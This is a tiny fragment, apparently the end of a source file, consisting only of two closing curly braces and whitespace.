             }
         }
